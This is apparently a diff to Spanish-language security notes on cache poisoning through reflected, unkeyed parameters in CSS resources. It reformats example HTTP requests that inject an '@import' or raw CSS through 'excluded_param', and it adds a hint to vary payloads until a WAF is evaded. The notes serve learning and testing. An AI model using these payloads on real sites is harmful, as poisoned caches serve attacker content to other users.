@@ -17,28 +17,20 @@ No solo el HTML es dinámico: **los recursos también** (CSS, JS) pueden **refle
 
 ## Cómo se ve
 
-### Inyectar un `@import` extra
-```http
-GET /style.css?excluded_param=123);@import… HTTP/1.1
-```
-```http
-HTTP/1.1 200 OK
-...
-@import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import…
-```
-El `123)` **cierra el `url(...)`** y el `;@import…` **agrega tu import** apuntando a un CSS tuyo.
+**Inyectar un `@import` extra:**
+> `GET /style.css?excluded_param=`==`123);@import…`==` HTTP/1.1`
 
-### Inyectar CSS directo (y ver dónde cae)
-```http
-GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1
-```
-```http
-HTTP/1.1 200 OK
-Content-Type: text/html
-...
-This request was blocked due to…alert(1){}*{color:red;}
-```
-Acá el payload disparó un **bloqueo (WAF)**, pero la respuesta de bloqueo **refleja** el input → señal de que **controlás contenido reflejado** en la cadena de recursos (probar variantes hasta evadir).
+**⬇️ se incrusta en el `@import url(...)` del CSS:**
+> `@import url(/site/home/index.part1.8a6715a2.css?excluded_param=`==`123);@import…`==
+
+El `123)` **cierra el `url(...)`** y el `;@import…` **agrega tu import**.
+
+**Inyectar CSS directo** (y ver dónde cae):
+> `GET /style.css?excluded_param=`==`alert(1)%0A{}*{color:red;}`==` HTTP/1.1`
+
+**⬇️ el WAF refleja el input en el bloqueo** (señal de que controlás contenido reflejado):
+> `HTTP/1.1 200 OK` · `Content-Type: text/html`
+> `This request was blocked due to…`==`alert(1){}*{color:red;}`==
 
 ## Por qué funciona
 - El parámetro (`excluded_param`) es **unkeyed** pero **se refleja** dentro del recurso → mismo principio que el HTML, pero en **CSS**.
